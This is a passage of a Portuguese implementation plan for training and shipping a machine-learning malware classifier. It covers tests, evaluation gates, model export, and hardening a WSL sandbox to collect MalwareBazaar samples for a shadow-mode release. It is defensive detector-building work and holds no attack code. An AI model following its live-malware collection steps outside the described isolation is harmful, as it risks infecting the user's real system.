- [ ] **Step 3: Implement `tools/treino/treinar.py`**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_treino_treinar.py -q && .venv/bin/ruff check .`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add tools/treino/treinar.py tests/test_treino_treinar.py pyproject.toml
git commit -m "Treino: gradient boosting, calibracao isotonica e limiares por tipo dentro do orcamento de FP"
```

---

### Task 8: Avaliação, portão e relatório

**Files:**
- Create: `tools/treino/avaliar.py`
- Test: `tests/test_treino_avaliar.py`

**Interfaces:**
- Consumes: `Treinado` (Task 7), `Tabela` (Task 6).
- Produces:
  - `MIN_LEGITIMOS_TESTE = 6000`, `MIN_MALICIOSOS_TESTE = 500`, `META_FP = 0.0005`, `META_FP_CATEGORIA = 0.005`,
    `META_DETECCAO = 0.80`
  - `@dataclass class Portao: kind: str; aprovado: bool; motivos: list[str]; fp: float; fp_categorias: dict[str,
    float]; deteccao_regras_perdem: float; deteccao_geral: float; n_legitimos: int; n_maliciosos: int`
  - `avaliar(tr: Treinado, t: Tabela, *, anterior: Treinado | None = None, legitimos_anteriores: Tabela | None =
    None) -> dict[str, Portao]` (na parte `teste`; "regras perdem" = maliciosos com `regra_alta == False`)
    - reprovação por qualquer meta não cumprida, por amostra mínima não atingida, ou (com `anterior`) por FP maior
      que o do modelo anterior nos legítimos anteriores; cada motivo em português no `motivos`.
  - `relatorio(portoes: dict[str, Portao], *, model_id: str, contagens: dict) -> str` (Markdown, só números)

- [ ] **Step 1: Write the failing tests**

```python
def test_tipo_com_poucos_dados_reprova_com_motivo():
    t = _sintetico(n=2000, semente=4)                 # bem menos de 6.000 legitimos no teste
    p = avaliar(treinar(t, max_iter=30), t)["sh"]
    assert p.aprovado is False and any("6000" in m for m in p.motivos)

def test_aprova_quando_todas_as_metas_batem(monkeypatch):
    from tools.treino import avaliar as av
    monkeypatch.setattr(av, "MIN_LEGITIMOS_TESTE", 100)
    monkeypatch.setattr(av, "MIN_MALICIOSOS_TESTE", 50)
    t = _sintetico(n=6000, semente=5, separavel=True)
    p = av.avaliar(treinar(t, max_iter=60), t)["sh"]
    assert p.aprovado, p.motivos

def test_relatorio_so_com_numeros():
    t = _sintetico(n=2000, semente=6)
    md = relatorio(avaliar(treinar(t, max_iter=20), t), model_id="script-teste", contagens={"script": 2000})
    assert "script-teste" in md and "| sh |" in md and "exemplo.invalid" not in md
```

(`_sintetico` e `treinar` vêm de um helper compartilhado `tests/treino_helpers.py`, estendido nesta task.)

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_treino_avaliar.py -q`
Expected: FAIL

- [ ] **Step 3: Implement `tools/treino/avaliar.py`**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_treino_avaliar.py -q && .venv/bin/ruff check .`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add tools/treino/avaliar.py tests/test_treino_avaliar.py tests/treino_helpers.py
git commit -m "Treino: avaliacao no teste temporal, portao por tipo e relatorio so com numeros"
```

---

### Task 9: Exportação para o JSON do Plano 1 e `golden.json`

**Files:**
- Create: `tools/treino/exportar.py`
- Create: `tests/test_ml_golden.py` (no **pacote**: confere o modelo instalado; pula se não houver)
- Test: `tests/test_treino_exportar.py`

**Interfaces:**
- Consumes: `Treinado` (Task 7), `Portao` (Task 8), `mandacaru.ml.model.parse_model`,
  `mandacaru.ml.features.FEATURE_VERSION`/nomes.
- Produces:
  - `exportar(tr: Treinado, portoes: dict[str, Portao], *, family: str, model_id: str, feature_code_sha: str,
    manifesto_sha256: str, metricas: dict) -> dict` no formato exato de `mandacaru.ml.model` (chaves de
    `_KEYS`). As árvores vêm de `clf._predictors[i][0].nodes`: folha (`is_leaf`) → `feature = -1`; nó interno →
    `feature = feature_idx`, `threshold = num_threshold`, `left`/`right`; `value` de **todos** os nós;
    `base_score = clf._baseline_prediction`. Se algum filho não tiver índice maior que o pai, renumera em pré-ordem.
    `kinds[k] = {"gate_passed": portoes[k].aprovado, **tr.limiares[k]}`.
  - `golden(tr: Treinado, X: list[list[float]], n: int = 200, semente: int = 7) -> dict`:
    `{"family", "model_id", "vetores": [...], "raw": [...], "prob": [...]}` com `raw` = `clf.decision_function` e
    `prob` = calibração aplicada.
  - `conferir(json_modelo: dict, json_golden: dict) -> None`: `parse_model` + compara `raw_score`/`probability` com
    tolerância de 1e-9; levanta `AssertionError` com o índice divergente.
  - `main(argv=None) -> int` que escreve `elf.json`, `script.json`, `golden.json` (as duas famílias), relatório e
    manifesto numa pasta de saída, chamando `conferir` antes de gravar.
- `tests/test_ml_golden.py` (roda no CI quando o modelo existir): para cada família instalada em
  `src/mandacaru/ml/models/`, o `golden.json` instalado é reproduzido pelo avaliador puro com tolerância de 1e-9.

- [ ] **Step 1: Write the failing tests**

```python
def test_exportado_carrega_e_reproduz_o_sklearn():
    t = _sintetico_script(n=3000, semente=8)
    tr = treinar(t, max_iter=40)
    port = avaliar(tr, t)
    m = exportar(tr, port, family="script", model_id="script-teste", feature_code_sha="0" * 40,
                 manifesto_sha256="0" * 64, metricas={})
    g = golden(tr, t.X)
    conferir(m, g)                                    # 1e-9
    modelo = parse_model(json.dumps(m).encode())
    assert modelo.kinds["sh"].gate_passed is False    # poucos dados: reprovado
    assert len(json.dumps(m)) <= 3 * 1024 * 1024

def test_conferir_pega_divergencia():
    t = _sintetico_script(n=2000, semente=9)
    tr = treinar(t, max_iter=20)
    m = exportar(tr, avaliar(tr, t), family="script", model_id="x", feature_code_sha="0" * 40,
                 manifesto_sha256="0" * 64, metricas={})
    g = golden(tr, t.X)
    g["raw"][0] += 1e-3
    with pytest.raises(AssertionError):
        conferir(m, g)
```

E `tests/test_ml_golden.py`:

```python
def test_golden_do_modelo_instalado():
    pasta = Path(mandacaru.__file__).parent / "ml" / "models"
    if not (pasta / "golden.json").is_file():
        pytest.skip("nenhum modelo instalado")
    g = json.loads((pasta / "golden.json").read_text())
    for fam, dados in g.items():
        m = load_model(pasta / f"{fam}.json", expected_sha256=MODEL_SHA256[fam])
        for x, raw, prob in zip(dados["vetores"], dados["raw"], dados["prob"], strict=True):
            assert m.raw_score(x) == pytest.approx(raw, abs=1e-9)
            assert m.probability(x) == pytest.approx(prob, abs=1e-9)
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_treino_exportar.py tests/test_ml_golden.py -q`
Expected: FAIL em `test_treino_exportar.py` (`ModuleNotFoundError`); `test_ml_golden.py` pula

- [ ] **Step 3: Implement `tools/treino/exportar.py` and `tests/test_ml_golden.py`**; inclua `"ml/models/*.json"` já
coberto pelo package data (Plano 1) — o `golden.json` vai junto.

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_treino_exportar.py tests/test_ml_golden.py tests/test_politica.py -q && .venv/bin/ruff check .`
Expected: passam (golden pula)

- [ ] **Step 5: Commit**

```bash
git add tools/treino/exportar.py tests/test_treino_exportar.py tests/test_ml_golden.py
git commit -m "Treino: exportacao para o JSON estrito, golden.json e conferencia com tolerancia de 1e-9"
```

---

### Task 10: Comando único do pipeline e instalação do modelo no repositório

**Files:**
- Create: `tools/treino/pipeline.py` (`python -m tools.treino.pipeline --corpus ~/corpus --saida ~/saida
  --corte-teste AAAA-MM-DD --corte-calibracao AAAA-MM-DD [--conhecidos arquivo] [--anterior pasta]`: higiene →
  divisão → extração → treino → avaliação → exportação; imprime só contagens e o resumo do portão)
- Create: `tools/instalar_modelo.py` (roda na **Ubuntu-Dev**: lê uma pasta com os 3 JSON, valida cada um com
  `load_model`/`parse_model` e o `golden.json` com `conferir`, copia para `src/mandacaru/ml/models/` e reescreve o
  dicionário `MODEL_SHA256` em `src/mandacaru/ml/__init__.py`; recusa qualquer arquivo que não seja um dos 3 JSON)
- Test: `tests/test_treino_pipeline.py`, `tests/test_instalar_modelo.py`

**Interfaces:**
- Consumes: Tasks 2 a 9.
- Produces: `pipeline.main(argv) -> int` (0 = rodou; o portão reprovado não é erro); `instalar_modelo.main(argv) ->
  int` (1 = algum arquivo inválido; nada é copiado nesse caso).

- [ ] **Step 1: Write the failing tests**

```python
def test_pipeline_ponta_a_ponta_sintetico(tmp_path):
    corpus = _corpus_sintetico(tmp_path, n_scripts=300, n_elf=60)      # inofensivos, montados a mao
    assert pipeline.main(["--corpus", str(corpus), "--saida", str(tmp_path / "out"), "--corte-teste",
                          "2026-10-01", "--corte-calibracao", "2026-08-01"]) == 0
    out = tmp_path / "out"
    assert {p.name for p in out.iterdir()} >= {"elf.json", "script.json", "golden.json"}
    assert any(p.name.startswith("relatorio-") for p in out.iterdir())

def test_instalar_modelo_valida_e_fixa_o_hash(tmp_path):
    origem = _artefatos_validos(tmp_path)
    repo = _repo_falso(tmp_path)                       # copia minima de src/mandacaru/ml/__init__.py
    assert instalar_modelo.main([str(origem), "--repo", str(repo)]) == 0
    texto = (repo / "src/mandacaru/ml/__init__.py").read_text()
    for fam in ("elf", "script"):
        h = hashlib.sha256((repo / f"src/mandacaru/ml/models/{fam}.json").read_bytes()).hexdigest()
        assert f'"{fam}": "{h}"' in texto

def test_instalar_modelo_recusa_estranho(tmp_path):
    origem = _artefatos_validos(tmp_path)
    (origem / "amostra.bin").write_bytes(b"\x7fELF")
    assert instalar_modelo.main([str(origem), "--repo", str(_repo_falso(tmp_path))]) == 1
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_treino_pipeline.py tests/test_instalar_modelo.py -q`
Expected: FAIL

- [ ] **Step 3: Implement both commands**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest -q && .venv/bin/ruff check .`
Expected: suíte inteira passa

- [ ] **Step 5: Commit**

```bash
git add tools/treino/pipeline.py tools/instalar_modelo.py tests/test_treino_pipeline.py tests/test_instalar_modelo.py
git commit -m "Treino: pipeline em um comando e instalacao validada do modelo no repositorio"
```

---

# Parte B — Operação (ambiente isolado e máquina real)

As tarefas abaixo **não** são TDD: são procedimentos com verificação. Cada uma tem um **ponto de parada** quando
depende do usuário. Nenhuma roda na `Ubuntu-Dev` com amostras reais.

### Task 11: Endurecer a `UbuntuPentest` (F0) — **PARADA: precisa do usuário (root nessa distro)**

- [ ] **Step 1:** O usuário, no PowerShell do Windows, abre um shell root na distro:
  `wsl.exe -d UbuntuPentest -u root`
- [ ] **Step 2:** Dentro dela, como root:

```bash
cat > /etc/wsl.conf <<'EOF'
[automount]
enabled = false
mountFsTab = false

[interop]
enabled = false
appendWindowsPath = false
EOF
adduser --disabled-password --gecos "" treino
install -d -m 0700 -o treino -g treino /home/treino/corpus /home/treino/saida
```

- [ ] **Step 3:** No PowerShell: `wsl --terminate UbuntuPentest`
- [ ] **Step 4: Verificar** (`wsl.exe -d UbuntuPentest -u treino`) e guardar a saída em
  `~/saida/verificacao-ambiente.txt`:

```bash
ls -A /mnt/c 2>&1; command -v cmd.exe || echo "cmd.exe indisponivel"; sudo -n true 2>&1 | head -1; stat -c '%a %U' ~/corpus
```

Expected: `/mnt/c` vazio ou inexistente; `cmd.exe indisponivel`; `sudo` pede senha ou não existe; `700 treino`.

- [ ] **Step 5:** Clonar o repositório **público** só para leitura (sem credenciais), na branch deste plano, e criar o
  venv de treino:

```bash
git clone --branch feat/classificador-ia-treino https://github.com/VandyckLN/mandacaru ~/mandacaru
python3 -m venv ~/venv && ~/venv/bin/pip install --require-hashes -r ~/mandacaru/tools/treino/requirements.txt
```

(O `requirements.txt` com hashes já foi gerado e commitado na Task 1.)

### Task 12: Coleta de dados (F2) — **PARADA: chave do MalwareBazaar e vários dias**

- [ ] **Step 1:** O usuário cria a conta gratuita no abuse.ch e exporta a chave **só na sessão**:
  `read -rs MB_AUTH_KEY && export MB_AUTH_KEY`
- [ ] **Step 2:** Coleta diária, até atingir os alvos do spec (10–30 mil ELF; alguns milhares de scripts):
  `cd ~/mandacaru && ~/venv/bin/python -m tools.treino.baixar --corpus ~/corpus --cota 2000`
  Expected: uma linha com `baixados=N pulados=M`; se `parou=daily_limit_reached`, repetir no dia seguinte.
- [ ] **Step 3:** Legítimos (ainda na `UbuntuPentest`, como `treino`, com rede):
  - pacotes Ubuntu/Debian: `apt-get download $(cat ~/mandacaru/tools/treino/pacotes.txt)` numa pasta `~/benignos/deb`
    (a lista `pacotes.txt` — ~2.000 pacotes populares de `main`/`universe`, incluindo Go/Rust estáticos — é gerada
    nesta etapa e commitada depois);
  - PyPI: `pip download --no-deps --no-binary :all: -d ~/benignos/pypi <top 1000 versões fixadas>`;
  - npm: `npm pack <top 1000 versões fixadas>` em `~/benignos/npm`;
  - difíceis: `upx` sobre cópias de binários legítimos (`~/benignos/upx_legitimo`), AppImages, instaladores `.run`,
    `rustup-init.sh` e o `install.sh` do nvm (`~/benignos/instalador_curl_sh`), artefatos de build e temporários do
    pip (`~/benignos/build_tmp`, `~/benignos/pip_tmp`).
  - Ingestão, uma vez por pasta, com a `categoria` da pasta:
    `~/venv/bin/python -m tools.treino.benignos --corpus ~/corpus --pasta ~/benignos/deb --source ubuntu`
- [ ] **Step 4:** Hashes legítimos conhecidos (só hashes de amostras maliciosas saem):
  `~/venv/bin/python -m tools.treino.higiene --corpus ~/corpus --saida ~/saida/conhecidos.txt`
- [ ] **Step 5: Verificar** contagens: `jq -r '.label' ~/corpus/manifesto.jsonl | sort | uniq -c`

### Task 13: Treino, portão e relatório (F3)

- [ ] **Step 1:** Escolher os cortes: `--corte-teste` = data que deixe ~15 % dos maliciosos mais recentes no teste;
  `--corte-calibracao` = ~15 % antes disso.
- [ ] **Step 2:**
  `~/venv/bin/python -m tools.treino.pipeline --corpus ~/corpus --saida ~/saida --corte-teste <data> --corte-calibracao <data> --conhecidos ~/saida/conhecidos.txt`
  Expected: resumo do portão por tipo; arquivos `elf.json`, `script.json`, `golden.json`, `relatorio-*.md`,
  `manifesto-*.txt` em `~/saida`.
- [ ] **Step 3:** Ler o relatório com o usuário. Tipo reprovado vai para o pacote em `alert` (é o próprio
  `gate_passed`). Se ELF e scripts reprovarem, investigar antes de seguir (mais dados, características).

### Task 14: Trazer o modelo para a `Ubuntu-Dev` e conferir nos arquivos do usuário

- [ ] **Step 1:** Cópia unidirecional (da `Ubuntu-Dev`, que lê a outra distro):

```bash
mkdir -p ~/modelo-novo && for f in elf.json script.json golden.json; do wsl.exe -d UbuntuPentest -u treino cat ~/saida/$f > ~/modelo-novo/$f; done
wsl.exe -d UbuntuPentest -u treino sh -c 'cat ~/saida/relatorio-*.md' > ~/modelo-novo/relatorio.md
```

- [ ] **Step 2:** `.venv/bin/python tools/instalar_modelo.py ~/modelo-novo` → Expected: saída 0 e `MODEL_SHA256`
  atualizado.
- [ ] **Step 3:** `.venv/bin/python -m pytest -q` → Expected: suíte inteira passa, inclusive `test_ml_golden.py` e
  `test_politica.py`.
- [ ] **Step 4:** Falsos positivos nos arquivos do próprio usuário (nada sai da máquina, nada é commitado):

```bash
find /usr/bin ~/.local ~/projetos ~/Downloads -type f -size -8M -print0 | xargs -0 .venv/bin/mandacaru ml avaliar --json > ~/fp-local.json
```

  Expected: nenhum `alto`/`reforco`, ou cada um explicado com o usuário.
- [ ] **Step 5:** Commit do modelo, do relatório (em `docs/ml/relatorio-<model_id>.md`) e do manifesto, só depois do
  `test_politica.py` verde.

### Task 15: Release 0.6.0 em modo sombra (F4/F5 em produção) — **PARADA: sudo e 2 a 4 semanas**

- [ ] **Step 1:** Versão `0.6.0` em `src/mandacaru/__init__.py`, `debian/changelog` e `CHANGELOG.md` (sai o
  "(em desenvolvimento)"); `docs/novidades-0.6.md` atualizado com o modelo real (tipos aprovados, métricas do
  relatório). Suíte verde.
- [ ] **Step 2:** O usuário monta e instala o `.deb` (`sudo apt install ./mandacaru_0.6.0_all.deb`) e confere
  `mandacaru ml status` (modelos e tipos aprovados) e `systemctl status mandacaru`.
- [ ] **Step 3:** **Esperar 2 a 4 semanas** de uso normal.
- [ ] **Step 4:** Revisar com o usuário: `sudo mandacaru ml sombra`. Expected: FP real dentro da meta (no máximo ~1
  isolamento indevido por mês); cada caso explicado.

### Task 16: Liberar o isolamento (F6)

- [ ] **Step 1: Write the failing test** — `Config().ml_mode == "isolate"` em `tests/test_ml_wiring.py` (troca o
  teste que hoje espera `"shadow"`) e `tests/test_packaging.py` continua exigindo o `mode` comentado.
- [ ] **Step 2:** Rodar e ver falhar.
- [ ] **Step 3:** `ml_mode: str = "isolate"` em `config.py`; README e `docs/novidades-0.6.md` atualizados ("modo
  padrão: isolate"); CHANGELOG `0.6.1`.
- [ ] **Step 4:** Suíte verde.
- [ ] **Step 5:** Commit e release 0.6.1.
